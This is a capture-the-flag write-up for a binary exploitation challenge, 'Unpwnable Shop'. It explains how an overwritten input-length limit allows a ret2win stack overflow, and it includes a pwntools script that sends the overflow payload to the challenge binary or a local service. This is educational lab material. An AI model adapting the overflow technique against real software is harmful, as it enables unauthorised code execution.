# Unpwnable Shop
## Challenge
This challenge lets us **insert our name** to access the shop. looking closely we can see that the **limit** of our input is positioned just after our name in the **stack** and also its initial value is 81! just enough to insert our name and **overwrite the limit** for later.
After inserting our name the program asks us what do we want to do, if we answer 69 we access a unique dialogue that makes us **re-input our name**, but this time the limit is whatever we inserted before, so if we send 88 bytes (76 for the username, 4 for the limit and 8 for the rbp), and the **address of the 'win' function** we successfully **overwrite** the return address and get the flag.

**Vulnerability**: [ret2win](https://book.hacktricks.xyz/binary-exploitation/stack-overflow/ret2win)

## Solution
```py
#!/usr/bin/env python3
from pwn import remote, args, ELF, p64, p32

elf = ELF("./unpwnable")
if args.REMOTE:
    r = remote('localhost', 1338) #Change host and port
else:
    r = elf.process()

# Overwriting limit
r.recvuntil(b':')
r.sendline(b'a' * 76 + p32(96))

# Sending right choice
r.recvuntil(b'stuff')
r.sendline(b'69')

#Overwriting return address
r.recvuntil(b'it.')
r.sendline(b'a'*88 + p64(elf.sym['win']))
r.recvuntil(b'Bye!\n')

#Flag!
r.interactive()
```

## Author
**Author**: [`@Mark-74`](https://github.com/Mark-74/) <br>
**Date**: 2024-08-12 <br>
**Category**: Binary Exploitation
